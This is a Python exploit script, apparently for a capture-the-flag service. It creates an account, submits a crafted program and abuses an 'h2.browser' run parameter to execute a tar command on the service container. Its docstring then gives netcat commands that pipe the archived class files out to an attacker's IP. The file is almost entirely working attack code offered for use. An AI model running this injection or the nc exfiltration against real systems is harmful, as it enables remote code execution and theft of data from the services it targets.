#!/usr/bin/env python3

import sys
import requests
import logging


"""
This sploit creates all.tar.gz on service contrainer with all class files via "tar czf all.tar.gz programs/"
After it you can second run command on service container for sending file to your computer, i.e.: "sh -c 'base64 < all.tar.gz | nc <YOUR IP> 10000'"
On your side you should run "nc -l -p 10000 | base64 -d > all.tar.gz"
"""

CREATE_USER_URL = "/api/users"
LOGIN_URL = "/api/users/login"
CREATE_LEVEL_URL = "/api/levels"
ADD_PROGRAM_URL = "/api/programs"
RUN_PROGRAM_URL = "/api/runs"

host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
base_url = "http://%s:80" % host

session = requests.Session()


def create_user_and_login():
    session.post(base_url + CREATE_USER_URL, json={
        "name": "hacker",
        "login": "hacker",
        "password": "hacker",
    })
    session.post(base_url + LOGIN_URL, json={
        "login": "hacker",
        "password": "hacker",
    })


def create_level():
    session.post(base_url + CREATE_LEVEL_URL, json={
        "title": "Just a level",
        "map": "...."
    })


def hack():
    r = session.post(base_url + ADD_PROGRAM_URL, json={
        "title": "€€€€€€€€€€€€€€€f\x07\x00\x01\x01\x002€€€€€€€€€€€€€€яzzzzzz\x07\x00\x16",
        "sourceCode": "openBrowser(\"programs/\")\nwrite(\"org/h2/tools/Server\")\nfun setMaze(s: str)\nbegin\nend",
        "levelId": 1
    }).json()
    program_id = r["response"]["programId"]
    r = session.post(base_url + RUN_PROGRAM_URL, json={
        "programId": program_id,
        "params": {
            "h2.browser": "tar,czf,all.tar.gz,%url",
        },
    })
    print(r.json())


def main():
    logging.basicConfig(level=logging.DEBUG)
    create_user_and_login()
    create_level()
    hack()


if __name__ == "__main__":
    main()


